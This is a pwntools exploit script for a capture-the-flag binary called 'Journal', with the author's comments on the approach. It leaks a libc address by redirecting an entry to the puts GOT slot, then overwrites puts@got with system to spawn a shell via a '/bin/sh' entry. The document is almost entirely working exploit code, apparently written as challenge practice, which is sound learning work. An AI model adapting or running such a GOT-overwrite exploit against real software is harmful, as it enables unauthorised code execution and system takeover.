#!/usr/bin/env python3

from pwn import *

exe = ELF("./Journal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

def add(index, value):
    r.sendlineafter(">> ", "1")
    r.sendlineafter("): ", str(index))
    r.sendlineafter(": ", value)

def view(index):
    r.sendlineafter(">> ", "2")
    r.sendlineafter("): ", str(index))
    return r.recvuntil("---------------------").split(b"--- Entry Content ---\n")[1].split(b"\n")[0]

def www(addr, value):
    r.sendlineafter(">> ", "1337")
    r.sendlineafter("): ", hex(addr))
    r.sendlineafter("): ", hex(value))

entries0 = 0x4040a0
invalid_choise = 0x40221b # Bad trial to overwrite strings in binary with /bin/sh

def main():

    add(0 , "any")
    add(1, "/bin/sh")
    www(entries0, exe.got.puts)
    libc_leak = u64(view(0).ljust(8, b"\x00"))
    libc.address = libc_leak - libc.sym.puts

    log.success(f"Libc leak : {hex(libc_leak)} Libc base {hex(libc.address)}")



    www(exe.got.puts, libc.symbols.system)
    view(1)






    

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()



# Create one entry 
# USE WWW to write over entries[0] = puts@got then view entries[0] and get the libc leak
# USE WWW to write over puts@got = one_gadget maybe ? 
# if the one_gadget doesn't work, we can write over puts@got with system and write over the the text "Goodbye!" with /bin/sh (hope it works : D) ( Doesn't work cuz the address wasn't writeable)
# Wrote one entry with /bin/sh and called puts(Entries[1])

